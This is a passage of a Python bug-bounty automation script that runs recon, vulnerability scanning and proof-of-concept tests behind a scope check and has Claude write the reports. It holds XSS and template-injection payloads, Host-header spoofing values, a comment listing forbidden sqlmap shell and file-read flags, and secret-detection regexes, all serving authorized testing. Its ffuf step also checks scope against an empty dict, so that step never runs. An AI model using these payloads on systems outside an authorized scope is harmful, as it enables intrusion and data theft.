#!/usr/bin/env python3
"""
Bug Bounty Orchestrator v2

Phases:
  recon  → subfinder + httpx + gau + katana (crawler) + JS file analysis + gowitness screenshots
  scan   → nuclei (auto-updated templates) + nmap + ffuf parameter discovery
           + header injection testing + JS secret scanning
  poc    → dalfox (XSS) + sqlmap (banner only) + redirect/cors/lfi/ssti/ssrf
           + IDOR with test accounts + gowitness evidence screenshots
  report → Ollama triage → Claude validates + writes reports (Intigriti/Bugcrowd)
           + Claude impact-chain analysis across all findings

SAFETY: Every outbound request is gated by is_in_scope(). The script refuses
to touch any host not explicitly listed in scope.yaml.
sqlmap is restricted to --technique=BT --banner — no --dump, no data access, ever.
SSRF/RCE proofs use OOB callbacks only (interactsh) — no internal network traversal.

Usage:
  python3 orchestrator.py --scope scope.yaml
  python3 orchestrator.py --scope scope.yaml --phase recon
  python3 orchestrator.py --scope scope.yaml --phase scan
  python3 orchestrator.py --scope scope.yaml --phase poc
  python3 orchestrator.py --scope scope.yaml --phase report
  python3 orchestrator.py --scope scope.yaml --dry-run
  python3 orchestrator.py --scope scope.yaml --fresh     # ignore saved state

Overnight:
  nohup python3 orchestrator.py --scope scope.yaml >> output/run.log 2>&1 &
  echo $! > output/run.pid

Env vars:
  ANTHROPIC_API_KEY   required for Claude validation + reports
  OLLAMA_URL          default: http://localhost:11434
  OLLAMA_MODEL        default: llama3.3:70b
"""

import argparse
import json
import logging
import os
import re
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests
import yaml

try:
    import anthropic
    _HAS_ANTHROPIC = True
except ImportError:
    _HAS_ANTHROPIC = False

CLAUDE_MODEL = "claude-opus-4-8"
OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://localhost:11434")
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "llama3.3:70b")

# sqlmap: boolean-blind + time-based only. Banner = DB version string.
# NEVER add --dump, --dump-all, --os-shell, --os-cmd, --file-read, --file-write
_SQLMAP_SAFE = [
    "--level=1", "--risk=1", "--technique=BT",
    "--batch", "--banner", "--timeout=30", "--retries=1",
    "--no-cast", "--disable-coloring",
]

_SSTI_PAYLOADS = [
    ("{{7*7}}", "Jinja2/Twig"),
    ("${7*7}", "FreeMarker/Mako"),
    ("<%= 7*7 %>", "ERB"),
    ("#{7*7}", "Ruby Haml"),
    ("*{7*7}", "Spring EL"),
]

_XSS_PAYLOADS = [
    "<img src=x onerror=alert(document.domain)>",
    '"><script>alert(document.domain)</script>',
    "'><svg onload=alert(document.domain)>",
]

# Built-in minimal param wordlist — used when no external wordlist is configured
_BUILTIN_PARAMS = [
    "id", "user", "username", "email", "name", "file", "path", "url", "redirect",
    "next", "return", "page", "limit", "offset", "sort", "order", "filter", "search",
    "q", "query", "token", "key", "api_key", "apikey", "secret", "callback", "jsonp",
    "format", "type", "action", "cmd", "exec", "load", "include", "fetch", "target",
    "dest", "host", "domain", "server", "proxy", "src", "ref", "forward", "data",
    "input", "template", "view", "lang", "debug", "test", "admin", "mode",
]

# Regex patterns for secrets in JS files
_JS_SECRET_PATTERNS = {
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "JWT Token": r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
    "Private Key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
    "API Key": r'(?i)(?:api[_-]?key|apikey)["\s]*[:=]["\s]*["\']([a-zA-Z0-9_\-]{20,})["\']',
    "Bearer Token": r'(?i)(?:bearer|auth[_-]?token)["\s]*[:=]["\s]*["\']([a-zA-Z0-9_.\-]{20,})["\']',
    "Password in JS": r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{8,})["\']',
    "Google API Key": r"AIza[0-9A-Za-z_\-]{35}",
    "Slack Token": r"xox[baprs]-[0-9A-Za-z\-]{10,}",
    "GitHub Token": r"gh[pousr]_[A-Za-z0-9]{36}",
    "Stripe Key": r"(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}",
}

# Regex patterns for API endpoints in JS
_JS_ENDPOINT_PATTERNS = [
    r'["\'](/api/[a-zA-Z0-9_/.-]+)["\']',
    r'["\'](/v[0-9]/[a-zA-Z0-9_/.-]+)["\']',
    r'fetch\(["\']([^"\']{5,})["\']',
    r'axios\.[a-z]+\(["\']([^"\']{5,})["\']',
    r'(?:url|endpoint|path)\s*[:=]\s*["\']([^"\']{5,})["\']',
    r'XMLHttpRequest[^;]+open\(["\'][A-Z]+["\'],\s*["\']([^"\']{5,})["\']',
]

# Headers to test for injection
_INJECTION_HEADERS = {
    "Host": "evil.example.com",
    "X-Forwarded-Host": "evil.example.com",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Original-URL": "/admin",
    "X-Rewrite-URL": "/admin",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
}

HTTP_HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def _make_logger(output_dir: Path) -> logging.Logger:
    output_dir.mkdir(parents=True, exist_ok=True)
    log = logging.getLogger("bb")
    log.setLevel(logging.DEBUG)
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(fmt)
    fh = logging.FileHandler(output_dir / "orchestrator.log")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)
    log.addHandler(ch)
    log.addHandler(fh)
    return log


# ---------------------------------------------------------------------------
# Scope enforcement
# ---------------------------------------------------------------------------

def is_in_scope(target: str, scope: dict) -> bool:
    if target.startswith(("http://", "https://")):
        host = urllib.parse.urlparse(target).hostname or ""
    else:
        host = target.split(":")[0]
    host = host.lower().strip()
    if not host:
        return False

    excluded = [d.lower() for d in scope.get("in_scope", {}).get("exclude", [])]
    for excl in excluded:
        if host == excl or host.endswith("." + excl):
            return False

    for domain in scope.get("in_scope", {}).get("domains", []):
        domain = domain.lower()
        if domain.startswith("*."):
            if host.endswith("." + domain[2:]):
                return True
        elif host == domain:
            return True

    import ipaddress
    for cidr in scope.get("in_scope", {}).get("ip_ranges", []):
        try:
            if ipaddress.ip_address(host) in ipaddress.ip_network(cidr, strict=False):
                return True
        except ValueError:
            pass
    return False


# ---------------------------------------------------------------------------
# Tool runner
# ---------------------------------------------------------------------------

def run_tool(cmd: list, timeout: int = 600, log: Optional[logging.Logger] = None) -> str:
    if log:
        log.debug("Running: %s", " ".join(str(c) for c in cmd))
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        if log:
            log.warning("Timed out after %ds: %s", timeout, cmd[0])
        return ""
    except FileNotFoundError:
        if log:
            log.warning("Tool not found: %s (skipping)", cmd[0])
        return ""


def tool_available(name: str) -> bool:
    return subprocess.run(["which", name], capture_output=True).returncode == 0


# ---------------------------------------------------------------------------
# Ollama
# ---------------------------------------------------------------------------

def ollama_chat(prompt: str, system: str = "") -> str:
    payload = {"model": OLLAMA_MODEL, "prompt": prompt, "stream": False}
    if system:
        payload["system"] = system
    try:
        resp = requests.post(f"{OLLAMA_URL}/api/generate", json=payload, timeout=180)
        resp.raise_for_status()
        return resp.json().get("response", "")
    except Exception as exc:
        return f"[Ollama error: {exc}]"


def ollama_triage_findings(raw_findings: list[dict], log: logging.Logger) -> list[dict]:
    if not raw_findings:
        return []
    log.info("Ollama triage: %d raw findings → filtering...", len(raw_findings))
    triaged: list[dict] = []
    for i in range(0, len(raw_findings), 20):
        batch = raw_findings[i:i + 20]
        prompt = f"""You are a senior bug bounty researcher triaging automated scanner output.
Review these findings. REMOVE: exact duplicates, informational-only with zero security impact,
scanner false positives (version disclosure with no CVE, missing headers with no demonstrated risk).
KEEP: anything with real attack surface — XSS, SQLi, SSRF, IDOR indicators, auth issues,
dangerous misconfigs, exposed sensitive files, interesting open ports.

For each kept finding add "triage_note": one sentence on why it's worth investigating.
Return ONLY a JSON array of kept findings. No commentary.

{json.dumps(batch, indent=2)}"""
        resp = ollama_chat(prompt)
        start, end = resp.find("["), resp.rfind("]") + 1
        if start >= 0 and end > start:
            try:
                kept = json.loads(resp[start:end])
                triaged.extend(kept)
                log.info("  batch %d: kept %d/%d", i // 20 + 1, len(kept), len(batch))
            except json.JSONDecodeError:
                triaged.extend(batch)
        else:
            triaged.extend(batch)
    return triaged


# ---------------------------------------------------------------------------
# JS file analysis (no external tool — pure regex)
# ---------------------------------------------------------------------------

def _fetch_js_urls(live_hosts: list[dict], scope: dict, log: logging.Logger) -> list[str]:
    """Scrape each live host HTML page to collect .js file URLs."""
    js_urls: list[str] = []
    for host_entry in live_hosts[:30]:  # cap to avoid spending the whole night here
        base_url = host_entry.get("url", host_entry) if isinstance(host_entry, dict) else host_entry
        if not is_in_scope(base_url, scope):
            continue
        try:
            resp = requests.get(base_url, timeout=10, headers=HTTP_HEADERS, allow_redirects=True)
            for match in re.findall(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', resp.text):
                if match.startswith("http"):
                    js_url = match
                elif match.startswith("//"):
                    js_url = "https:" + match
                else:
                    parsed = urllib.parse.urlparse(base_url)
                    js_url = f"{parsed.scheme}://{parsed.netloc}/{match.lstrip('/')}"
                if is_in_scope(js_url, scope) and js_url not in js_urls:
                    js_urls.append(js_url)
        except requests.RequestException:
            pass
    return js_urls


def analyze_js_files(
    live_hosts: list[dict],
    scope: dict,
    output_dir: Path,
    log: logging.Logger,
) -> tuple[list[dict], list[str]]:
    """
    Download JS files from live hosts. Returns:
    - secrets: list of {url, type, snippet} dicts
    - endpoints: list of discovered endpoint strings
    """
    js_urls = _fetch_js_urls(live_hosts, scope, log)
    log.info("Fetching %d JS files for secret/endpoint analysis...", len(js_urls))
    secrets: list[dict] = []
    endpoints: list[str] = []
    js_dir = output_dir / "js_files"
    js_dir.mkdir(exist_ok=True)

    for js_url in js_urls:
        try:
            resp = requests.get(js_url, timeout=15, headers=HTTP_HEADERS)
            content = resp.text
            filename = re.sub(r"[^a-zA-Z0-9._-]", "_", js_url[-60:])
            (js_dir / filename).write_text(content[:500_000], encoding="utf-8", errors="replace")

            # Secret scanning
            for secret_type, pattern in _JS_SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    snippet = match.group(0)[:120]
                    if not any(s["snippet"] == snippet for s in secrets):
                        secrets.append({"url": js_url, "type": secret_type, "snippet": snippet})
                        log.info("  JS secret [%s] in %s", secret_type, js_url)

            # Endpoint extraction
            for pattern in _JS_ENDPOINT_PATTERNS:
                for match in re.finditer(pattern, content):
                    ep = match.group(1)
                    if len(ep) > 5 and ep not in endpoints:
                        endpoints.append(ep)
        except requests.RequestException:
            pass

    if secrets:
        (output_dir / "js_secrets.json").write_text(json.dumps(secrets, indent=2))
        log.info("JS analysis: %d potential secrets, %d endpoints discovered", len(secrets), len(endpoints))
    return secrets, endpoints


# ---------------------------------------------------------------------------
# ffuf parameter discovery
# ---------------------------------------------------------------------------

def ffuf_params(url: str, wordlist_path: Optional[str], output_dir: Path, log: logging.Logger) -> list[str]:
    """Fuzz for hidden GET parameters. Returns list of discovered param names."""
    if not tool_available("ffuf"):
        return []
    if not is_in_scope(url, {}):  # basic check — caller ensures scope
        return []

    # Use provided wordlist or write built-in params to a temp file
    if wordlist_path and Path(wordlist_path).exists():
        wl = wordlist_path
    else:
        wl_path = output_dir / "builtin_params.txt"
        wl_path.write_text("\n".join(_BUILTIN_PARAMS))
        wl = str(wl_path)

    ffuf_out = output_dir / "ffuf_result.json"
    sep = "&" if "?" in url else "?"
    fuzz_url = f"{url}{sep}FUZZ=test_value_12345"

    out = run_tool([
        "ffuf", "-u", fuzz_url, "-w", wl,
        "-mc", "200,201,301,302,403",
        "-fs", "0",
        "-json", "-o", str(ffuf_out),
        "-t", "10",   # 10 threads — polite
        "-rate", "30",
        "-s",         # silent
    ], timeout=120, log=log)

    discovered: list[str] = []
    if ffuf_out.exists():
        try:
            data = json.loads(ffuf_out.read_text())
            for result in data.get("results", []):
                param = result.get("input", {}).get("FUZZ", "")
                if param:
                    discovered.append(param)
        except json.JSONDecodeError:
            pass
    return discovered


# ---------------------------------------------------------------------------
# Header injection testing
# ---------------------------------------------------------------------------

def test_header_injection(url: str, scope: dict, log: logging.Logger) -> list[dict]:
    """
    Test for Host header injection, X-Forwarded-Host, admin bypass headers.
    These can lead to: password reset poisoning, cache poisoning, WAF bypass.
    """
    if not is_in_scope(url, scope):
        return []

    findings: list[dict] = []
    try:
        baseline = requests.get(url, timeout=10, headers=HTTP_HEADERS, allow_redirects=False)
        baseline_body = baseline.text[:5000]
        baseline_status = baseline.status_code
    except requests.RequestException:
        return []

    for header, value in _INJECTION_HEADERS.items():
        try:
            test_headers = {**HTTP_HEADERS, header: value}
            resp = requests.get(url, timeout=10, headers=test_headers, allow_redirects=False)

            # Detect reflection of injected value
            if value in resp.text and value not in baseline_body:
                findings.append({
                    "name": f"Header injection: {header} reflected",
                    "type": "header-injection",
                    "host": url,
                    "poc_header": header,
                    "poc_value": value,
                    "poc_status": "reflected",
                    "poc_note": f"{header}: {value} appears in response body — potential cache poisoning or password reset poisoning",
                })
                log.info("Header injection: %s reflected at %s", header, url)

            # Detect status code change (e.g., /admin bypass)
            if "URL" in header and resp.status_code != baseline_status:
                findings.append({
                    "name": f"Header bypass: {header} changed response",
                    "type": "header-bypass",
                    "host": url,
                    "poc_header": header,
                    "poc_value": value,
                    "poc_status": "status_change",
                    "poc_note": f"{header} changed status {baseline_status}→{resp.status_code} — possible access control bypass",
                })
                log.info("Header bypass: %s changed status at %s", header, url)

        except requests.RequestException:
            pass

    return findings


# ---------------------------------------------------------------------------
# gowitness screenshots
# ---------------------------------------------------------------------------

def gowitness_screenshot(urls: list[str], output_dir: Path, log: logging.Logger) -> Path:
    """Screenshot a list of URLs with gowitness. Returns screenshot directory."""
    ss_dir = output_dir / "screenshots"
    ss_dir.mkdir(exist_ok=True)
    if not tool_available("gowitness") or not urls:
        return ss_dir
    urls_file = output_dir / "screenshot_targets.txt"
    urls_file.write_text("\n".join(urls))
    log.info("gowitness: capturing %d screenshot(s)...", len(urls))
    run_tool([
        "gowitness", "file",
        "-f", str(urls_file),
        "--destination", str(ss_dir),
        "--timeout", "10",
        "--delay", "1",
    ], timeout=300, log=log)
    count = len(list(ss_dir.glob("*.png")) + list(ss_dir.glob("*.jpg")))
    log.info("gowitness: %d screenshot(s) saved to %s", count, ss_dir)
    return ss_dir


# ---------------------------------------------------------------------------
# Claude: validate + report + chain analysis
# ---------------------------------------------------------------------------

def claude_validate_and_report(
    findings: list[dict],
    program: dict,
    output_dir: Path,
    log: logging.Logger,
) -> None:
    if not _HAS_ANTHROPIC:
        log.error("pip3 install anthropic && export ANTHROPIC_API_KEY=sk-...")
        return
    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        log.error("ANTHROPIC_API_KEY not set — skipping Claude")
        return

    client = anthropic.Anthropic(api_key=api_key)
    platform = program.get("platform", "intigriti")
    reports_dir = output_dir / "reports"
    reports_dir.mkdir(exist_ok=True)

    system_prompt = f"""You are a senior bug bounty researcher writing professional vulnerability
reports for the {platform.title()} platform. You have deep knowledge of CVSS v3.1 scoring,
common web vulnerability classes, and what makes a report accepted vs rejected.

Rules:
1. Be accurate — don't overstate impact. Triagers penalize inflated severity.
2. If a finding is a false positive, say so clearly with reasoning.
3. Include concrete steps to reproduce that a stranger can follow exactly.
4. For {platform}: {'use CVSS v3.1 vector strings' if platform == 'intigriti' else 'map to Bugcrowd P1-P5 and VRT taxonomy'}.
5. Reference relevant CWE IDs.
6. Remediation must be specific — not just "sanitize inputs"."""

    for idx, finding in enumerate(findings):
        log.info("Claude validating [%d/%d]: %s", idx + 1, len(findings), finding.get("name", "?"))
        platform_format = (
            "Intigriti format: Title | Severity | CVSS Score | CVSS Vector | Description | "
            "Steps to Reproduce | Impact | Affected Asset | Remediation | References (CWE/CVE)"
            if platform == "intigriti" else
            "Bugcrowd format: Title | Priority (P1-P5) | VRT Category | Description | "
            "Steps to Reproduce | Impact | Affected Asset | Remediation | References"
        )
        poc_evidence = ""
        if finding.get("poc_status") == "confirmed":
            poc_evidence = f"\nPoC evidence:\n{json.dumps(finding.get('poc_evidence', finding.get('poc_note', '')), indent=2)}"
            if finding.get("poc_url"):
                poc_evidence += f"\nPoC URL: {finding['poc_url']}"
            if finding.get("poc_payload"):
                poc_evidence += f"\nPoC payload: {finding['poc_payload']}"

        user_prompt = f"""Validate and write a complete bug report for this finding.
Program: {program.get('name', 'Unknown')} | Platform: {platform}
{platform_format}

Finding data:
{json.dumps(finding, indent=2)}
{poc_evidence}

If this is a false positive or has no real security impact, output only:
{{"valid": false, "reason": "..."}}

Otherwise write the full report in markdown."""

        try:
            resp = client.messages.create(
                model=CLAUDE_MODEL,
                max_tokens=4096,
                thinking={"type": "adaptive"},
                system=system_prompt,
                messages=[{"role": "user", "content": user_prompt}],
            )
            report_text = next((b.text for b in resp.content if b.type == "text"), "")
            if not report_text or '"valid": false' in report_text:
                log.info("  → false positive or no impact: %s", report_text[:120])
                continue

            slug = re.sub(r"[^a-zA-Z0-9-]", "-", finding.get("name", f"finding-{idx+1}"))[:50]
            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            path = reports_dir / f"{ts}-{slug}.md"
            path.write_text(
                f"# {finding.get('name', 'Finding')}\n\n"
                f"**Program:** {program.get('name')} | **Platform:** {platform} | "
                f"**Generated:** {datetime.now().isoformat()}\n\n---\n\n{report_text}\n\n"
                f"---\n\n## Raw Finding\n\n```json\n{json.dumps(finding, indent=2)}\n```\n",
                encoding="utf-8",
            )
            log.info("  → report saved: %s", path.name)
        except Exception as exc:
            log.error("  → Claude error: %s", exc)
        time.sleep(2)

    # Impact chain analysis — look at ALL findings together
    if len(findings) >= 2:
        _claude_chain_analysis(findings, program, reports_dir, client, log)


def _claude_chain_analysis(
    findings: list[dict],
    program: dict,
    reports_dir: Path,
    client: "anthropic.Anthropic",
    log: logging.Logger,
) -> None:
    """Ask Claude to find attack chains across all findings — elevates severity."""
    log.info("Claude: running impact chain analysis across %d findings...", len(findings))
    summary = [
        {"name": f.get("name", "?"), "host": f.get("host", "?"),
         "type": f.get("type", "?"), "poc_status": f.get("poc_status", "?")}
        for f in findings
    ]
    try:
        resp = client.messages.create(
            model=CLAUDE_MODEL,
            max_tokens=2048,
            thinking={"type": "adaptive"},
            messages=[{"role": "user", "content": f"""Analyze these bug bounty findings from
{program.get('name', 'Unknown')} and identify any attack chains where combining multiple findings
creates higher impact than each finding alone.

Examples of chains:
- Open redirect + XSS → session theft without user interaction (Critical)
- CORS misconfiguration + auth endpoint → cross-origin credential theft
- SSRF + internal metadata endpoint → cloud credential exposure
- Path traversal + exposed config files → RCE via config injection
- Header injection + cache → cache poisoning for all users

Findings:
{json.dumps(summary, indent=2)}

For each chain found, write: Chain Name | Combined Severity | Which findings | Attack narrative | Recommended report title.
If no meaningful chains exist, say so briefly."""}],
        )
        chain_text = next((b.text for b in resp.content if b.type == "text"), "")
        if chain_text and "no meaningful" not in chain_text.lower():
            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            (reports_dir / f"{ts}-CHAIN-ANALYSIS.md").write_text(
                f"# Attack Chain Analysis\n\n**Program:** {program.get('name')}\n"
                f"**Generated:** {datetime.now().isoformat()}\n\n---\n\n{chain_text}\n",
                encoding="utf-8",
            )
            log.info("Chain analysis saved — review for elevated-severity chain reports")
    except Exception as exc:
        log.warning("Chain analysis failed: %s", exc)


# ---------------------------------------------------------------------------
# Phase: Recon
# ---------------------------------------------------------------------------

def phase_recon(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
    log.info("=== PHASE: RECON ===")
    domains_raw = scope.get("in_scope", {}).get("domains", [])
    base_domains = list({d.lstrip("*.").lower() for d in domains_raw})
    discovered: list[str] = list(base_domains)
    skip = scope.get("scan", {}).get("skip_tools", [])

    # Subdomain enumeration
    if "subfinder" not in skip and tool_available("subfinder"):
        log.info("subfinder: enumerating %d domain(s)...", len(base_domains))
        for domain in base_domains:
            if dry_run:
                log.info("[DRY-RUN] subfinder -d %s", domain)
                continue
            out = run_tool(["subfinder", "-d", domain, "-silent"], timeout=300, log=log)
            for sub in out.splitlines():
                sub = sub.strip().lower()
                if sub and is_in_scope(sub, scope) and sub not in discovered:
                    discovered.append(sub)

    if "amass" not in skip and tool_available("amass"):
        for domain in base_domains:
            if dry_run:
                continue
            out = run_tool(["amass", "enum", "-passive", "-d", domain], timeout=600, log=log)
            for sub in out.splitlines():
                sub = sub.strip().lower()
                if sub and is_in_scope(sub, scope) and sub not in discovered:
                    discovered.append(sub)

    log.info("Discovered %d in-scope host(s)", len(discovered))
    state["discovered_hosts"] = discovered
    _save_state(state, output_dir)

    # Live host detection
    live: list[dict] = []
    if not dry_run and "httpx" not in skip and tool_available("httpx"):
        hosts_file = output_dir / "hosts.txt"
        hosts_file.write_text("\n".join(discovered))
        out = run_tool(
            ["httpx", "-l", str(hosts_file), "-silent", "-status-code", "-title",
             "-follow-redirects", "-json"],
            timeout=300, log=log,
        )
        for line in out.splitlines():
            try:
                entry = json.loads(line)
                if is_in_scope(entry.get("url", ""), scope):
                    live.append(entry)
            except json.JSONDecodeError:
                pass
        log.info("Live hosts: %d", len(live))
    elif dry_run:
        live = [{"url": f"https://{h}"} for h in discovered[:3]]
        log.info("[DRY-RUN] httpx would probe %d hosts", len(discovered))

    state["live_hosts"] = live
    _save_state(state, output_dir)

    # Katana web crawl
    if not dry_run and "katana" not in skip and tool_available("katana"):
        log.info("katana: crawling %d live host(s)...", len(live))
        crawled_urls: list[str] = []
        for host_entry in live[:20]:
            url = host_entry.get("url", "")
            if not url or not is_in_scope(url, scope):
                continue
            out = run_tool([
                "katana", "-u", url, "-silent", "-depth", "3",
                "-js-crawl", "-headless=false",
                "-rate-limit", "10",
                "-timeout", "10",
            ], timeout=180, log=log)
            for u in out.splitlines():
                u = u.strip()
                if u and is_in_scope(u, scope) and u not in crawled_urls:
                    crawled_urls.append(u)
        if crawled_urls:
            state["crawled_urls"] = crawled_urls
            (output_dir / "crawled_urls.txt").write_text("\n".join(crawled_urls))
            log.info("katana: %d URLs crawled", len(crawled_urls))
            _save_state(state, output_dir)

    # GAU — historical URLs from archives
    if not dry_run and "gau" not in skip and tool_available("gau"):
        gau_urls: list[str] = []
        rps = scope.get("rate_limit", {}).get("requests_per_second", 5)
        for domain in base_domains:
            out = run_tool(
                ["gau", "--threads", "1", "--delay", str(max(1, 1000 // rps)), domain],
                timeout=300, log=log,
            )
            for u in out.splitlines():
                u = u.strip()
                if u and is_in_scope(u, scope) and u not in gau_urls:
                    gau_urls.append(u)
        if gau_urls:
            state["discovered_urls"] = gau_urls
            (output_dir / "gau_urls.txt").write_text("\n".join(gau_urls))
            log.info("gau: %d historical URLs", len(gau_urls))
            _save_state(state, output_dir)

    # JS file analysis
    if not dry_run and live:
        js_secrets, js_endpoints = analyze_js_files(live, scope, output_dir, log)
        state["js_secrets"] = js_secrets
        state["js_endpoints"] = js_endpoints
        _save_state(state, output_dir)

    # Screenshots of live hosts
    if not dry_run and live and "gowitness" not in skip:
        live_urls = [h.get("url", "") for h in live if h.get("url")]
        gowitness_screenshot(live_urls[:50], output_dir, log)


# ---------------------------------------------------------------------------
# Phase: Scan
# ---------------------------------------------------------------------------

def phase_scan(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
    log.info("=== PHASE: SCAN ===")
    live_hosts = state.get("live_hosts", [])
    targets = [
        (h.get("url", h) if isinstance(h, dict) else h)
        for h in live_hosts
        if is_in_scope(h.get("url", h) if isinstance(h, dict) else h, scope)
    ]
    if not targets:
        log.warning("No live targets — run recon phase first")
        return

    scan_cfg = scope.get("scan", {})
    skip = scan_cfg.get("skip_tools", [])
    all_findings: list[dict] = []

    # Update nuclei templates before scanning
    if tool_available("nuclei") and not dry_run:
        log.info("Updating nuclei templates...")
        run_tool(["nuclei", "-update-templates", "-silent"], timeout=120, log=log)

    # Nuclei
    if "nuclei" not in skip and tool_available("nuclei"):
        templates = scan_cfg.get("nuclei_templates",
                                  ["exposures", "misconfiguration", "vulnerabilities"])
        severities = ",".join(scan_cfg.get("nuclei_severity", ["critical", "high", "medium"]))
        targets_file = output_dir / "live_targets.txt"
        targets_file.write_text("\n".join(targets))
        rate = scope.get("rate_limit", {}).get("nuclei_rate", 20)

        if dry_run:
            log.info("[DRY-RUN] nuclei -l targets -t %s -severity %s", templates, severities)
        else:
            log.info("nuclei: scanning %d targets...", len(targets))
            out = run_tool([
                "nuclei", "-l", str(targets_file),
                "-t", ",".join(templates),
                "-severity", severities,
                "-rate-limit", str(rate),
                "-json", "-silent", "-no-color",
                "-interactsh-url", "https://interact.sh",  # for OOB detection within nuclei
            ], timeout=7200, log=log)
            for line in out.splitlines():
                try:
                    f = json.loads(line)
                    if is_in_scope(f.get("host", f.get("url", "")), scope):
                        all_findings.append(f)
                except json.JSONDecodeError:
                    pass
            log.info("nuclei: %d findings", len(all_findings))

    # Nmap — light port scan on discovered hosts
    if "nmap" not in skip and tool_available("nmap") and not dry_run:
        timing = scope.get("rate_limit", {}).get("nmap_timing", 3)
        ports = scan_cfg.get("nmap_ports", "80,443,8080,8443,8888,3000,5000,9000,9200,6379,27017")
        delay = scope.get("rate_limit", {}).get("delay_between_hosts", 2)
        for host in state.get("discovered_hosts", [])[:20]:
            if not is_in_scope(host, scope):
                continue
            out = run_tool(
                ["nmap", f"-T{timing}", "-p", ports, "--open", "-oG", "-", host],
                timeout=120, log=log,
            )
            if "open" in out:
                open_ports = re.findall(r"(\d+)/open", out)
                all_findings.append({
                    "name": f"Interesting open ports: {host}",
                    "type": "nmap", "host": host,
                    "open_ports": open_ports, "raw": out,
                    "triage_note": f"Ports {open_ports} open — review for admin panels, debug endpoints, databases",
                })
            time.sleep(delay)
    elif dry_run:
        log.info("[DRY-RUN] nmap would scan %d hosts", len(state.get("discovered_hosts", [])))

    # ffuf parameter discovery on interesting endpoints
    if "ffuf" not in skip and tool_available("ffuf") and not dry_run:
        wordlist = scan_cfg.get("ffuf_wordlist", "")
        interesting = [t for t in targets if "?" not in t][:10]  # param-less URLs only
        for url in interesting:
            if not is_in_scope(url, scope):
                continue
            log.debug("ffuf: discovering params at %s", url)
            params = ffuf_params(url, wordlist or None, output_dir, log)
            if params:
                all_findings.append({
                    "name": f"Hidden parameters discovered: {url}",
                    "type": "param-discovery", "host": url,
                    "discovered_params": params,
                    "triage_note": f"Parameters {params} not in normal page flow — test for injection",
                })
                log.info("ffuf: found params %s at %s", params, url)
    elif dry_run:
        log.info("[DRY-RUN] ffuf would run parameter discovery on top targets")

    # Header injection testing
    if not dry_run:
        log.info("Testing header injection on %d targets...", min(len(targets), 15))
        for url in targets[:15]:
            if not is_in_scope(url, scope):
                continue
            header_findings = test_header_injection(url, scope, log)
            all_findings.extend(header_findings)

    # JS secret findings from recon phase → treat as scan findings
    for secret in state.get("js_secrets", []):
        all_findings.append({
            "name": f"Secret exposed in JS: {secret['type']}",
            "type": "secret-exposure",
            "host": secret["url"],
            "secret_type": secret["type"],
            "snippet": secret["snippet"][:100] + "...",
            "triage_note": f"{secret['type']} found in public JS file — verify if live credential",
        })

    # Save raw findings
    if all_findings:
        (output_dir / "raw_findings.json").write_text(json.dumps(all_findings, indent=2))
        log.info("Saved %d raw findings", len(all_findings))

    # Ollama triage
    if not dry_run and all_findings:
        triaged = ollama_triage_findings(all_findings, log)
        (output_dir / "triaged_findings.json").write_text(json.dumps(triaged, indent=2))
        log.info("After Ollama triage: %d findings", len(triaged))
        state["triaged_findings"] = triaged
        _save_state(state, output_dir)
    elif dry_run:
        log.info("[DRY-RUN] Ollama triage would process %d findings", len(all_findings))


# ---------------------------------------------------------------------------
# PoC helpers
# ---------------------------------------------------------------------------

def _categorize(f: dict) -> str:
    combined = f"{f.get('name','')} {f.get('template-id','')} {' '.join(f.get('info',{}).get('tags',[]))}".lower()
    for kw in ("xss", "cross-site-scripting"):
        if kw in combined: return "xss"
    for kw in ("sqli", "sql-injection", "sql injection"):
        if kw in combined: return "sqli"
    for kw in ("ssrf", "server-side request"):
        if kw in combined: return "ssrf"
    for kw in ("open-redirect", "open redirect"):
        if kw in combined: return "redirect"
    for kw in ("lfi", "path-traversal", "directory-traversal", "file-inclusion"):
        if kw in combined: return "lfi"
    for kw in ("cors", "cross-origin"):
        if kw in combined: return "cors"
    for kw in ("ssti", "template-injection"):
        if kw in combined: return "ssti"
    for kw in ("secret", "exposure", "api-key", "token"):
        if kw in combined: return "secret"
    if f.get("type") in ("header-injection", "header-bypass", "param-discovery"):
        return f.get("type", "generic")
    return "generic"


def _target_url(finding: dict) -> str:
    return finding.get("matched-at") or finding.get("url") or finding.get("host") or ""


def _inject_param(url: str, param: str, payload: str) -> str:
    """Inject payload into an existing param or add new one."""
    if param and f"{param}=" in url:
        return re.sub(
            rf"({re.escape(param)}=)[^&]*",
            lambda m: m.group(1) + urllib.parse.quote(payload),
            url,
        )
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param}={urllib.parse.quote(payload)}"


def _poc_xss(finding: dict, scope: dict, discovered_params: list[str], output_dir: Path, log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}

    poc_dir = output_dir / "poc" / "xss"
    poc_dir.mkdir(parents=True, exist_ok=True)

